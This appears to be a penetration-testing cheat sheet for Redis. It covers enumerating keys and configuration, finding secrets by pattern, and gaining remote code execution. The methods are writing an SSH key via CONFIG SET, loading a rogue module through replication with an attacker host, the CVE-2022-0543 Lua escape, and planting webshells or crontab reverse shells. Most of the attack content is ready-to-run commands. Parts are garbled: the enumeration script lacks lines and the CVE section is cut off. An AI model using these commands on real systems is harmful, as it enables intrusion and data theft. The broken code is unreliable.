## Overview

Redis (Remote Dictionary Server) is an open-source, in-memory key-value data store used as a database, cache, message broker, and queue. It listens on **TCP port 6379** by default and frequently ships with **no authentication**, making it one of the most exploited services during network penetration tests.

::card-group
  ::card
  ---
  title: Default Port
  icon: i-lucide-network
  ---
  `6379` (default), `6380` (TLS), `16379` (cluster bus), `26379` (Sentinel)
  ::

  ::card
  ---
  title: Protocol
  icon: i-lucide-cable
  ---
  RESP (REdis Serialization Protocol) — plain text protocol over TCP. Human-readable request/response.
  ::

  ::card
  ---
  title: Authentication
  icon: i-lucide-lock
  ---
  Single password via `AUTH` command (legacy) or ACL-based username/password (Redis 6+). **Many deployments have no auth.**

  ```python [redis_enum.py]
      print(f"[*] Used memory: {info['used_memory_human']}")
      print(f"[*] Config file: {info.get('config_file', 'N/A')}")

      for i in range(16):
          r.execute_command(f'SELECT {i}')
          keys = r.keys('*')
          if keys:
              print(f"\n[*] Database {i}: {len(keys)} keys")
              for key in keys[:20]:  # First 20 keys

                  print(f"    {key.decode()} (type: {key_type})")

                  if key_type == 'string':
                      val = r.get(key)
                      print(f"      -> {val.decode() if val else 'None'}")

                      val = r.hgetall(key)
                      print(f"      -> {val}")

                      print(f"      -> {val}")
                  elif key_type == 'set':

                      print(f"      -> {val}")

      # Configuration dump
      print("\n[*] Configuration:")
      config = r.execute_command('CONFIG GET *')
      for i in range(0, len(config), 2):
          key = config[i].decode() if isinstance(config[i], bytes) else config[i]
          val = config[i+1].decode() if isinstance(config[i+1], bytes) else config[i+1]
          if any(s in key for s in ['pass', 'bind', 'dir', 'dbfile', 'module', 'protected']):
              print(f"    {key} = {val}")

  except redis.exceptions.AuthenticationError:
      print("[-] Authentication required")
  except redis.exceptions.ConnectionError as e:
      print(f"[-] Connection failed: {e}")
  ```

```bash [Terminal]
# Connect and search for interesting keys
redis-cli -h <target> -p 6379

# Pattern matching
KEYS *pass*
KEYS *token*
KEYS *secret*
KEYS *session*
KEYS *admin*
KEYS *user*
KEYS *key*
KEYS *api*
KEYS *cred*
KEYS *auth*
KEYS *flag*
KEYS *config*
KEYS *private*

# Scan with pattern (production-safe, non-blocking)
SCAN 0 MATCH *pass* COUNT 1000
SCAN 0 MATCH *session* COUNT 1000
SCAN 0 MATCH *token* COUNT 1000

# Dump all keys and values
redis-cli -h <target> --scan --pattern '*' | while read key; do
  echo "KEY: $key"
  redis-cli -h <target> GET "$key" 2>/dev/null
  redis-cli -h <target> HGETALL "$key" 2>/dev/null
done

# Extract all string values
redis-cli -h <target> KEYS '*' | xargs -I {} redis-cli -h <target> GET {}
```

## Exploitation

### Unauthenticated Access

::warning
Redis with no authentication is the **most critical and common finding**. Full server control is immediate.
::

```bash [Terminal]
# Verify unauthenticated access
redis-cli -h <target> PING
# Response: PONG = no auth required
# Response: NOAUTH = authentication required

# Quick info dump
redis-cli -h <target> INFO

# Check write capabilities
redis-cli -h <target> CONFIG GET dir
redis-cli -h <target> CONFIG GET dbfilename

# Full config dump
redis-cli -h <target> CONFIG GET '*'
```

### RCE via SSH Key Write

::note
Write your SSH public key into the `authorized_keys` file of a user on the target system. Requires `CONFIG SET` permission and knowledge of a writable home directory.
::

::steps{level="4"}

#### Generate SSH Keypair

```bash [Terminal]
ssh-keygen -t ed25519 -f ./redis_rsa -N ""
```

#### Prepare the Key Payload

```bash [Terminal]
# Add padding newlines to avoid corruption
(echo -e "\n\n"; cat redis_rsa.pub; echo -e "\n\n") > payload.txt
```

#### Write Key to Redis and Dump to Disk

```bash [Terminal]
# Flush and inject
redis-cli -h <target> FLUSHALL
cat payload.txt | redis-cli -h <target> -x SET sshkey

# Set output directory and filename
redis-cli -h <target> CONFIG SET dir /root/.ssh/
redis-cli -h <target> CONFIG SET dbfilename "authorized_keys"
redis-cli -h <target> SAVE

# Alternative: target other users
redis-cli -h <target> CONFIG SET dir /home/redis/.ssh/
redis-cli -h <target> CONFIG SET dbfilename "authorized_keys"
redis-cli -h <target> SAVE

# Alternative: use /var/lib/redis/.ssh/
redis-cli -h <target> CONFIG SET dir /var/lib/redis/.ssh/
redis-cli -h <target> CONFIG SET dbfilename "authorized_keys"
redis-cli -h <target> SAVE
```

#### Connect via SSH

```bash [Terminal]
ssh -i redis_rsa root@<target>
ssh -i redis_rsa redis@<target>
```

### RCE via Redis Module Loading

::caution
Redis allows loading shared object modules that execute arbitrary C code. This is one of the **most reliable RCE vectors** on modern Redis.
::

::tabs
  :::tabs-item{icon="i-lucide-download" label="redis-rogue-server"}

  ```bash [Terminal]
  git clone https://github.com/n0b0dyCN/redis-rogue-server.git
  cd redis-rogue-server

  # Compile the malicious module
  cd RedisModulesSDK/
  make

  # Run rogue server (interactive shell)
  python3 redis-rogue-server.py \
    --rhost <target> \
    --rport 6379 \
    --lhost <attacker_ip> \
    --lport 21000

  # With password
  python3 redis-rogue-server.py \
    --rhost <target> \
    --rport 6379 \
    --lhost <attacker_ip> \
    --lport 21000 \
    --passwd "redis_password"

  # Choose: interactive shell or reverse shell
  ```
  :::

  :::tabs-item{icon="i-lucide-hammer" label="RedisModules-ExecuteCommand"}

### RCE via Master-Slave Replication

::note
Abuse Redis replication to sync a malicious `.so` module from an attacker-controlled Redis instance to the target, then load it.
::

```bash [Terminal]
# Using redis-rogue-server (automated)
python3 redis-rogue-server.py \
  --rhost <target> --rport 6379 \
  --lhost <attacker_ip> --lport 21000

# Manual replication attack
# Step 1: Start rogue Redis on attacker
redis-server --port 21000 --loadmodule ./module.so

# Step 2: Make target replicate from attacker
redis-cli -h <target> SLAVEOF <attacker_ip> 21000

# Step 3: Wait for sync, then load module
redis-cli -h <target> MODULE LOAD /tmp/module.so

# Step 4: Execute commands
redis-cli -h <target> system.exec "id"

# Step 5: Cleanup - stop replication
redis-cli -h <target> SLAVEOF NO ONE
```

### CVE-2022-0543 — Lua Sandbox Escape (Debian/Ubuntu)

::caution
Critical vulnerability in Redis packages on Debian/Ubuntu. The Lua library in these packages retains the `package` module, allowing sandbox escape and arbitrary command execution. **CVSS 10.0**.
::

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Exploit"}

  Lua sandbox escape in Debian/Ubuntu Redis packages. The `package` Lua module is not disabled, allowing `loadlib()` to load arbitrary shared objects. Affects Debian-packaged Redis before 6.0.16, 6.2.x before 6.2.7, 7.0.x before 7.0.1.

  ::

  ::field{name="CVE-2023-25155" type="Integer Overflow — CVSS 8.2"}
  Integer overflow in `SRANDMEMBER`, `ZRANDMEMBER`, and `HRANDFIELD` commands with negative count. Allows heap overflow and potential RCE.
  ::

  ::field{name="CVE-2023-22458" type="Integer Overflow — CVSS 5.5"}
  Integer overflow in `HRANDFIELD` and `ZRANDMEMBER` can lead to denial of service via assertion failure.

  ::field{name="CVE-2021-32762" type="Heap Overflow — CVSS 8.8"}

  ::field{name="CVE-2021-32761" type="Integer Overflow"}

## Useful One-Liners

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Quick Wins"}
  ```bash [Terminal]
  # Check if auth is required
  redis-cli -h <target> PING 2>&1 | grep -q PONG && echo "[+] NO AUTH" || echo "[-] Auth required"

  # Get version instantly
  redis-cli -h <target> INFO server 2>/dev/null | grep redis_version

  # Check if CONFIG SET is allowed
  redis-cli -h <target> CONFIG SET dir /tmp/ 2>/dev/null && echo "[+] CONFIG SET allowed" || echo "[-] CONFIG SET denied"

  # Check writable directories
  for dir in /tmp/ /var/www/html/ /var/spool/cron/ /root/.ssh/ /home/; do
    redis-cli -h <target> CONFIG SET dir "$dir" 2>/dev/null && echo "[+] Writable: $dir"
  done

  # Extract requirepass from config
  redis-cli -h <target> CONFIG GET requirepass

  # Monitor real-time commands (sniff credentials)
  redis-cli -h <target> MONITOR

  # Check total keys across all databases
  redis-cli -h <target> INFO keyspace

  # Quick session dump
  redis-cli -h <target> KEYS '*sess*' | head -5 | xargs -I {} redis-cli -h <target> GET {}
  ```

## Pentest Checklist

::steps{level="4"}

#### Test for Unauthenticated Access

Connect without credentials using `redis-cli -h <target> PING`. PONG response means no authentication.

#### Enumerate Server and Configuration

Run `INFO`, `CONFIG GET *`, `CLIENT LIST`, `ACL LIST` to gather version, OS, bind address, and security settings.

#### Enumerate All Databases and Keys

Iterate `SELECT 0` through `SELECT 15`, run `KEYS *` and search for sensitive patterns like sessions, passwords, and tokens.

#### Attempt Brute Force if Auth Required

Use Hydra, Nmap brute script, or Metasploit to test common and default passwords.

#### Test CONFIG SET Write Capabilities

Check if `CONFIG SET dir` and `CONFIG SET dbfilename` are allowed — this enables all file-write RCE vectors.

#### Attempt RCE via SSH Key Injection

Write your public key to `/root/.ssh/authorized_keys` or other user home directories.

#### Attempt RCE via Webshell

Identify web root directories and write a PHP/JSP/ASPX webshell via Redis.

#### Attempt RCE via Crontab

Write a reverse shell crontab entry to `/var/spool/cron/` or `/etc/cron.d/`.

#### Test Module Loading for RCE

Use `redis-rogue-server` to load a malicious `.so` module via master-slave replication.

#### Test CVE-2022-0543 Lua Sandbox Escape

On Debian/Ubuntu Redis instances, attempt Lua sandbox escape via `package.loadlib`.

#### Exfiltrate Data and Search for Credentials

Dump all keys, session tokens, cached credentials, and connection strings for lateral movement.

#### Check for Sentinel and Cluster Nodes

Enumerate additional Redis nodes via `SENTINEL masters`, `CLUSTER NODES` for expanded attack surface.

#### Document All Findings

Record evidence of unauthenticated access, RCE, data exposure, and remediation recommendations.
